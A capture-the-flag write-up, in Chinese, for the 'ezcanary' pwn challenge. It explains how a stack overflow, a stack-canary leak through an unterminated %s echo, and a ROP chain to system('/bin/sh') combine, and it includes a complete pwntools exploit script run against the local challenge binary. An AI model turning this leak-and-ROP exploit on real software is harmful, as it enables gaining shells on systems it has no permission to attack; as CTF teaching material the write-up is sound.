# ezcanary

## 题目简述

`main` 的 `buf[0x10]` 两次都由 `read(0, buf, 0x100)` 写入，存在栈溢出，但二进制启用了 Canary 和 NX。第一次输入后程序用 `%s` 回显未终止的缓冲区，可覆盖 Canary 固定为零的最低字节并泄露其余 7 字节；第二次输入再写回完整 Canary，构造 ROP 调用 `system("/bin/sh")`。

## 解题过程

从 `buf` 到 Canary 的偏移为 `0x18`。第一次发送 `0x19` 个非零字节：前 `0x18` 字节填满缓冲区及对齐区，第 `0x19` 字节覆盖 Canary 的低位 NUL。`printf("%s")` 因而继续输出后面的 7 个随机字节。真实 Canary 的最低字节按 ABI 为 `0x00`，补回即可。

第二次输入的布局为：`0x18` 字节填充、泄露的 Canary、保存的 RBP、对齐 `ret`、`pop rdi; ret`、全局 `/bin/sh` 地址和 `system@plt`。

```python
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/pwn")
elf = ELF("../dist/pwn")

pop_rdi = 0x40138B
ret = pop_rdi + 1

marker = b"A" * 0x19
io.sendafter(b"Ur name plz?\n", marker)
io.recvuntil(marker)
canary = u64(b"\x00" + io.recvn(7))

io.sendafter(b"right?", b"Y")
payload = flat(
    b"A" * 0x18,
    canary,
    0x404500,
    ret,
    pop_rdi,
    elf.sym["binsh"],
    elf.plt["system"],
)
io.sendafter(b"plz.\n", payload)
io.interactive()
```

仓库当前的 `backdoor()` 只执行 `echo no backdoor!`，因此规范利用应按附带源码和官方 exp 使用上述 ROP；若某个历史部署可直接 ret2backdoor，那是附件/部署版本差异，不能作为当前仓库版本的通用结论。

## 方法总结

Canary 只有最低字节固定为 NUL，恰好可以阻断普通字符串泄露；若攻击者能覆盖该字节，`%s` 仍可能越界读出其余部分。利用时必须准确保留 Canary、处理栈对齐并以实际附件为准，不应把赛事期间的版本事故混入标准解法。
